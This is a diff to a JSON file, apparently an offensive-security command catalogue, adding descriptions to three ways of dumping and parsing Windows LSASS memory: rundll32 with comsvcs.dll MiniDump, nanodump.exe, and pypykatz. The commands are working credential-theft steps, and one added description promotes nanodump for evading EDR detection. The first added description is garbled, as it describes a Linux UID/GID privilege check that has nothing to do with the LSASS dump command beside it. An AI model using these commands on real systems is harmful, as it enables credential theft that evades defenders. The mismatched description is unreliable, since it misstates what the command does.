@@ -218,15 +218,18 @@
   "variations": [
     {
       "label": "comsvcs.dll MiniDump (LOLBAS)",
-      "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full"
+      "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "nanodump (evasive)",
-      "command": "nanodump.exe --write C:\\lsass.dmp"
+      "command": "nanodump.exe --write C:\\lsass.dmp",
+      "description": "Dumps LSASS memory using nanodump, which creates a minidump with system call evasion techniques. Harder for EDR to detect than standard Mimikatz or ProcDump-based approaches."
     },
     {
       "label": "Parse offline with pypykatz",
-      "command": "pypykatz lsa minidump lsass.dmp"
+      "command": "pypykatz lsa minidump lsass.dmp",
+      "description": "Parse offline with pypykatz. See the command syntax for exact parameters and flags."
     }
   ],
   "steps": [
